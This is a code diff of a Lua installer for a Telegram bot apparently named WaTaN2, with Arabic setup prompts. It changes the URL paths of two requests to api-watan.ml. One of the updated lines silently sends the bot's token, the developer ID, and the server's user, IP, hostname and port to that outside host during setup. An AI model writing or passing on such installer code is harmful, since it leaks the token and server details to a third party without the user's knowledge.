@@ -25,7 +25,7 @@ if not DevAbs:get(Server.."IdWaTaN2") then
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
-data,res = https.request("https://api-watan.ml/Api/WaTaN2/index.php?Ban=WaTaN2&Info&Id="..DevId)
+data,res = https.request("https://api-watan.ml/WaTaN2/index.php?Ban=WaTaN2&Info&Id="..DevId)
 if res == 200 then
 Abs = json:decode(data)
 if Abs.Result.Info == 'Is_Spam' then
@@ -77,7 +77,7 @@ WaTaN2 = DevAbs:get(Server.."TokenWaTaN2"):match("(%d+)"),
 SudoIds = {DevAbs:get(Server.."IdWaTaN2")},
 }
 Create(Config, "./config.lua") 
-https.request("https://api-watan.ml/Api/WaTaN2/index.php?Get=WaTaN2&DevId="..DevAbs:get(Server.."IdWaTaN2").."&TokenBot="..DevAbs:get(Server.."TokenWaTaN2").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+https.request("https://api-watan.ml/WaTaN2/index.php?Get=WaTaN2&DevId="..DevAbs:get(Server.."IdWaTaN2").."&TokenBot="..DevAbs:get(Server.."TokenWaTaN2").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("WaTaN2.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
